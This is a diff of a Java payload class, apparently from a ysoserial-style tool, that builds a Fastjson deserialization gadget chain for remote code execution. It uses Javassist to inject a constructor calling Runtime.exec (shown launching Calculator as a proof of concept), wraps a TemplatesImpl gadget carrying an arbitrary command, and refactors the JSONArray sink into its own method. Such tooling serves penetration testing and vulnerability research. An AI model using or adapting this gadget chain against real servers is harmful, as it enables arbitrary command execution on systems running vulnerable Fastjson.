@@ -12,6 +12,7 @@ import java.lang.reflect.Field;
 import java.util.HashMap;
 
 
+@SuppressWarnings({"rawtypes", "unchecked","unused"})
 public class Fastjson1 implements ObjectPayload<Object> {
     @Override
     public Object getObject(String command) throws Exception {
@@ -22,9 +23,12 @@ public class Fastjson1 implements ObjectPayload<Object> {
         CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
         constructor.setBody("Runtime.getRuntime().exec(\"open -na Calculator\");");
         clazz.addConstructor(constructor);
-        final Object templates;
-        templates = Gadgets.createTemplatesImpl(command);
+        Object templates = Gadgets.createTemplatesImpl(command);
 
+        return getFastjsonSink(templates);
+    }
+
+    static Object getFastjsonSink(Object templates) throws Exception {
         JSONArray jsonArray = new JSONArray();
         jsonArray.add(templates);
 
